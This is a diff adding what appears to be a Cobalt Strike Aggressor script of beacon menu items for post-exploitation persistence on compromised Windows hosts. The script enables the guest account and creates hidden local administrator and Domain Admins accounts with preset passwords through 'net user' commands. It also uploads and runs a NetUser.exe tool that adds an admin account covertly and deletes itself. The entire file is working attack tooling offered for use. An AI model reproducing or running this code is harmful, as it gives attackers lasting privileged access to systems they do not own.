@@ -1,0 +1,69 @@
+menu "Adding Users" {
+  item "Activate the guest user" {
+    $bid = $1['@'];
+    bshell($bid, "net user guest /active:yes");
+  }
+
+  item "Create an Admin User" {
+    $bid = $1['@'];
+    $Dialog = dialog("Add a local administrator user",%(username => "qax$", passwd => "Qianxin@123.", "groups" => "administrators", bid => $bid),&add_localuser);
+    dialog_description($Dialog, "Add a local administrator user，Pay attention to password complexity in account policies.");
+    drow_text($Dialog, "username", "username: ");
+    drow_text($Dialog, "passwd", "passwd: ");
+    drow_text($Dialog, "groups", "groups(administrators): ");
+    dbutton_action($Dialog, "Execute");
+    dialog_show($Dialog);
+  }
+  sub add_localuser{
+    local('$Name');
+    $Name = $3['username'];
+    $Pwd = $3['passwd'];
+    $groups = $3['groups'];
+    bshell($bid, "net user $Name $Pwd /add && net localgroup $groups $Name /add");
+  }
+
+  item "Adding a Domain Admin User"{
+    $bid = $1['@'];
+    $Dialog = dialog("Add Domain Admin",%(username => "qax$",passswd => "Qianxin@123.",bid => $bid),&add_domainuser);
+    dialog_description($Dialog, "Add a domain administrator user and pay attention to the password complexity in the account policy.");
+    drow_text($Dialog, "username", "username: ");
+    drow_text($Dialog, "passswd", "passswd: ");
+    dbutton_action($Dialog, "Execute");
+    dialog_show($Dialog);
+  }
+  sub add_domainuser{
+    local('$Name');
+    $Name = $3['username'];
+    $Pwd = $3['passswd'];
+    bshell($bid, "net user $Name $Pwd /add /domain && net group \"Domain Admins\" $Name /add /domain");
+  }
+
+
+#  item "API add administrator user" {
+#    $bid = $1['@'];
+#    btask($bid, "username：admin，password：Admin@123.", "");
+#    bexecute($bid, "/scripts/Add user/bof_net_user.o");
+#  }
+
+  menu "bypass create admin user"{
+    item "Upload NetUser"{
+      local('$bid');
+      foreach $bid ($1){
+        bupload($1, script_resource("/scripts/Add user/NetUser.exe"));
+        blog($1, "Project gallery：https://github.com/lengjibo/NetUser")
+      }
+    }
+    item "ExecuteNetUser" {
+      $bid = $1['@'];
+      $dialog = dialog("NetUser", %(bid => $bid), &NetUser);
+      dialog_description($dialog, "After execution, an account is automatically added to the administrator group and the program is automatically deleted. User：test123 Pass：Test@#123");
+      dbutton_action($dialog, "Execute");
+      dialog_show($dialog);
+    }
+    sub NetUser{
+      bshell($bid, "NetUser.exe");
+    }
+  }
+
+
+}
